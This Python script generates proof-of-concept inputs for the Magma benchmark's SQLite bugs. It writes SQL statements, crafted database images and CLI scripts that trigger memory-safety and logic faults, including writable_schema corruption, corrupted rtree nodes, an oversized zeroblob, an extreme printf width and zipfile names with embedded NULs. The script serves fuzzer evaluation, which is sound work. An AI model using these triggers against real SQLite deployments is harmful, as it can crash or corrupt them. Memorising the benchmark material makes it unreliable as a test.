#!/usr/bin/env python3
"""Write one PoC per magma SQLite bug into argv[1].

File names are h<harness>_<bug>[_variant]. Every input starts with the
4-byte little-endian config word of support/harness.h; harness_1 inputs
then carry `u32le N | N-byte database image | SQL`.

Magma counts only the first canary that triggers in a run, so each PoC is
kept minimal: e.g. any compound SELECT with ORDER BY triggers SQL018 first.
"""
import os
import sqlite3
import struct
import sys
import tempfile

out = sys.argv[1]
os.makedirs(out, exist_ok=True)

# support/harness.h config bits
FKEY, INTERNAL_FN, DEFENSIVE, UNTRUSTED, NO_VIEW = 0, 1, 2, 3, 4
ONE_STEP, EXTRA = 10, 11


def cfg(*bits, optmask=0):
    raw = optmask << 16
    for b in bits:
        raw |= 1 << b
    return struct.pack("<I", raw)


def w(name, data):
    if isinstance(data, str):
        data = data.encode()
    with open(os.path.join(out, name), "wb") as f:
        f.write(data)


# ---- harness_0: SQL ---------------------------------------------------------

h0 = {
    # Prefix query longer than the pending (uncommitted) term.
    "sql001": "CREATE VIRTUAL TABLE f USING fts5(x);"
              "BEGIN; INSERT INTO f VALUES('ab');"
              "SELECT * FROM f WHERE f MATCH 'abcdef*'; COMMIT;",
    # "unsafe use of virtual table" is reported without aborting the walk.
    "sql002": "CREATE VIRTUAL TABLE r USING rtree(id,a,b);"
              "CREATE VIEW v AS SELECT * FROM r;"
              "PRAGMA trusted_schema=OFF; SELECT * FROM v;",
    "sql003": "CREATE TABLE t1(a); CREATE TABLE t2(b);"
              "INSERT INTO t1 VALUES(1); INSERT INTO t2 VALUES(2);"
              "SELECT DISTINCT * FROM t1 LEFT JOIN (SELECT b FROM t2) ON 1;",
    "sql006": "CREATE TABLE t1(aa, bb); INSERT INTO t1 VALUES(1,2),(5,6);"
              "CREATE TABLE t2(x); INSERT INTO t2 VALUES(1);"
              "SELECT (SELECT DISTINCT sum(aa) OVER() FROM t1 ORDER BY 1), x"
              " FROM t2 ORDER BY 1;",
    "sql007": "CREATE TABLE x(a); PRAGMA writable_schema=ON;"
              "INSERT INTO sqlite_schema VALUES"
              "('table','t','t',0,'CREATE TABLE t AS SELECT 1');"
              "PRAGMA writable_schema=OFF; PRAGMA schema_version=99;"
              "SELECT * FROM x;",
    # 30 MB zeroblob: under SQLITE_MAX_LENGTH, over the 25 MB heap limit.
    "sql009": "SELECT lower(zeroblob(30000000));",
    "sql010": "CREATE TABLE t(a,b,c,d,e,f,g,h,i,j);"
              "SELECT * FROM t WHERE (a,b,c,d,e,f,g,h,i,j)"
              " IN (SELECT 1,2,3,4,5,6,7,8,9,10);",
    "sql011": "CREATE VIRTUAL TABLE r USING rtree(id, x0, x1);"
              "INSERT INTO r VALUES(1,0,1);"
              "UPDATE r_node SET data=x'00000000' WHERE nodeno=1;"
              "PRAGMA schema_version=77; SELECT * FROM r;",
    "sql012": "CREATE TABLE t(a, b AS (a+1) NOT NULL);"
              "INSERT INTO t VALUES(1); PRAGMA integrity_check;",
    "sql013": "CREATE TABLE t1(a,b,c,d,e,f); CREATE INDEX i1 ON t1(a,b,c,d,e,f);"
              "ANALYZE; DELETE FROM sqlite_stat1;"
              "INSERT INTO sqlite_stat1 VALUES"
              "('t1','i1','1000000 100000 10000 1000 100 50 1');"
              "ANALYZE sqlite_schema; SELECT * FROM t1 WHERE e=5;",
    "sql014": "SELECT 1 UNION SELECT (1,2);",
    "sql015": "CREATE TABLE t(g AS (c1+1), " +
              ",".join("c%d" % i for i in range(70)) + ");"
              "INSERT INTO t(c0) VALUES(1); SELECT g FROM t;",
    "sql018": "SELECT 1 UNION SELECT 2 ORDER BY 1;",
    "sql020": "CREATE TABLE t(a,b); INSERT INTO t VALUES(1,2);"
              "SELECT sum(a) OVER (PARTITION BY 1 ORDER BY 2) FROM t;",
    # Reach only (see README.md).
    "sql016_reach": "SELECT 'abc' < 5, CAST(1 AS TEXT) = 1;",
    "sql019_reach": "SELECT printf('%*.*f', 2147483647, 2147483647, 1e300);",
}
for bug, sql in h0.items():
    w("h0_%s.bin" % bug, cfg() + sql.encode())

# SQL002 via SQLITE_DBCONFIG_ENABLE_VIEW=0 ("access to view prohibited").
w("h0_sql002_noview.bin",
  cfg(NO_VIEW) + b"CREATE TABLE t(a); CREATE VIEW v AS SELECT a FROM t;"
                 b"SELECT * FROM v;")
# SQL017 needs the internal implies_nonnull_row() function.
w("h0_sql017.bin",
  cfg(INTERNAL_FN) + b"CREATE TABLE t1(a,b); CREATE INDEX i1 ON t1(a+b);"
                     b"INSERT INTO t1 VALUES(1,2);"
                     b"SELECT implies_nonnull_row(a+b=3, a) FROM t1"
                     b" WHERE a+b>0;")

# ---- harness_1: database image + SQL ----------------------------------------


def image(setup):
    """Build a database file with the system sqlite3 module and return it."""
    with tempfile.TemporaryDirectory() as d:
        path = os.path.join(d, "x.db")
        con = sqlite3.connect(path)
        con.executescript(setup)
        con.commit()
        con.close()
        with open(path, "rb") as f:
            return f.read()


def h1(name, setup, sql, *bits):
    img = image(setup)
    w(name, cfg(*bits) + struct.pack("<I", len(img)) + img + sql.encode())


h1("h1_sql007.bin",
   "CREATE TABLE x(a); PRAGMA writable_schema=ON;"
   "INSERT INTO sqlite_schema VALUES"
   "('table','t','t',0,'CREATE TABLE t AS SELECT 1');",
   "SELECT * FROM x;")
h1("h1_sql011.bin",
   "CREATE VIRTUAL TABLE r USING rtree(id, x0, x1);"
   "INSERT INTO r VALUES(1,0,1);"
   "UPDATE r_node SET data=x'00000000' WHERE nodeno=1;",
   "SELECT * FROM r;")
h1("h1_sql012.bin",
   "CREATE TABLE t(a, b AS (a+1) NOT NULL); INSERT INTO t VALUES(1);",
   "PRAGMA integrity_check;")

# ---- harness_2: CLI script ------------------------------------------------------

# Directory entry ("data" NULL) whose name has an embedded NUL: nName counts
# the bytes, strlen() of the "%s/" copy does not.
w("h2_sql004.bin", cfg() + b"SELECT zipfile(CAST(x'610062' AS TEXT), NULL);\n")
# zipfile vtab (archive created in the harness sandbox) and a NULL name.
w("h2_sql005.bin",
  cfg() + b"CREATE VIRTUAL TABLE temp.z USING zipfile('z.zip');\n"
          b"INSERT INTO z(name, mode, mtime, data) VALUES(NULL, NULL, NULL, 'x');\n")
# A sqlite_schema "table" row that PRAGMA table_info knows nothing about.
w("h2_sql008.bin",
  cfg() + b"CREATE TABLE t(a);\n"
          b"PRAGMA writable_schema=ON;\n"
          b"INSERT INTO sqlite_schema VALUES('table','ghost','ghost',0,"
          b"'CREATE TABLE ghost(x)');\n"
          b".dump\n")
